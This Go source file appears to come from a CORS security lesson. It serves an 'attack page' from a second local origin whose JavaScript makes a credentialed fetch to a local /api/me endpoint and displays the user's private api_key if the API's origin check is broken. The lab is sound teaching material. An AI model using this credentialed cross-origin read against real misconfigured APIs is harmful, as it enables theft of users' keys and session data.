package main

import (
	"html/template"
	"log"
	"net/http"
)

// attackPage serves a page from attackAddr, an origin the API never meant to
// trust. When a logged-in user opens it, the page fetches /api/me with their
// cookies and shows whatever the browser lets it read. If the API's origin
// check is sound, the browser withholds the response and the fetch throws;
// if the check is broken, the private api_key appears on the page.
//
// This is the whole point of the lesson: the page does nothing clever. It is
// the server's Access-Control-Allow-Origin that decides whether the read works.
func attackPage(logger *log.Logger) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		if err := attackTmpl.Execute(w, nil); err != nil {
			logger.Printf("render attack page: %v", err)
		}
	})
}

// The page targets the fixed local API address. The JS comment explaining the
// credentials flag lives here, because html/template strips comments from the
// rendered output.
var attackTmpl = template.Must(template.New("attack").Parse(`<!doctype html>
<meta charset="utf-8">
<title>其他 origin 的頁面</title>
<h1>這是另一個 origin（:9666）的頁面</h1>
<p>按下按鈕，這個頁面會帶著你在 :8080 的 Cookie 去讀 /api/me。</p>
<button id="go">讀取 alice 的 /api/me</button>
<pre id="out"></pre>
<script>
document.getElementById("go").onclick = async () => {
  const out = document.getElementById("out");
  try {
    // credentials: "include" sends the user's :8080 cookies on this
    // cross-origin request. The browser only hands back the response body
    // if the API's Access-Control-Allow-Origin names this page's origin.
    const res = await fetch("http://127.0.0.1:8080/api/me", {credentials: "include"});
    out.textContent = "讀到了：" + await res.text();
  } catch (err) {
    out.textContent = "讀不到（CORS 擋下）：" + err;
  }
};
</script>
`))
